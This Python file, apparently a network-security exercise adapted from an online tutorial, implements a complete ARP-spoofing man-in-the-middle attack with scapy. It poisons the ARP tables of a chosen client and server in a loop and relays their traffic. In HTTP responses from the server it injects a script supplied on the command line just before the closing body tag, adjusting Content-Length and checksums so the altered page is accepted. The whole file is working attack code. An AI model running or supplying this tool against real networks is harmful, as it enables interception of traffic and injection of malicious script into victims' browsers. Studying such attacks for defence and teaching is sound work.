# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
	parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
	parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
	parser.add_argument("-s", "--script", help="script to inject", required=True)
	parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
	return parser.parse_args()


def debug(s):
	global verbosity
	if verbosity >= 1:
		print('#{0}'.format(s))
		sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	global attackerIP
	result = sr1(ARP(op="who-has", psrc=attackerIP, pdst=IP), verbose=False)
	return result[ARP].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
	while True:
		spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
		spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
		time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
	debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
	send(ARP(op="is-at", psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
	debug(f"restoring ARP table for {dstIP}")
	send(ARP(op="is-at", psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script
	if packet[Ether].src == attackerMAC:
		return
	
	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
		if packet[IP].src == serverIP and packet[IP].dst == clientIP:
			if packet[IP].haslayer(Raw):
				httpLoad = packet[Raw].load.decode('utf-8')
				loadSubString = httpLoad.split()
				payload = '<script>' + script + '</script>'
				httpLoad = httpLoad.replace('</body>', payload + '</body>')
				try:
					index = loadSubString.index('Content-Length:')
					length = loadSubString[index+1]
					newLength = int(length) + len(payload)
					#print(f"length: {length}")
					#print(f"new: {newLength}")
					httpLoad = httpLoad.replace('Content-Length: ' + length, 'Content-Length: ' + str(newLength))
					#print(httpLoad)
				except ValueError:
					pass
				packet[Raw].load = httpLoad.encode('utf-8')
				packet[IP].len = packet[IP].len + len(payload)
				del packet[IP].chksum
				del packet[TCP].chksum
			packet[Ether].src = attackerMAC
			packet[Ether].dst = clientMAC
			frags = fragment(packet, fragsize = 500)
			for frag in frags:
				sendp(frag)
		elif packet[IP].src == clientIP and packet[IP].dst == serverIP:
			packet[Ether].src = attackerMAC
			packet[Ether].dst = serverMAC
			frags = fragment(packet, fragsize = 500)
			for frag in frags:
				sendp(frag)


if __name__ == "__main__":
	args = parse_arguments()
	verbosity = args.verbosity
	if verbosity < 2:
		conf.verb = 0 # minimize scapy verbosity
	conf.iface = args.interface # set default interface

	clientIP = args.clientIP
	serverIP = args.serverIP
	attackerIP = get_if_addr(args.interface)
	script = args.script
	if script is None:
		script = 'alert("Successful Injection!")'

	clientMAC = mac(clientIP)
	serverMAC = mac(serverIP)
	attackerMAC = get_if_hwaddr(args.interface)

	# start a new thread to ARP spoof in a loop
	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
	spoof_th.start()

	# start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
	sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
	sniff_th.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		restore(clientIP, clientMAC, serverIP, serverMAC)
		restore(serverIP, serverMAC, clientIP, clientMAC)
		sys.exit(1)

	restore(clientIP, clientMAC, serverIP, serverMAC)
	restore(serverIP, serverMAC, clientIP, clientMAC)
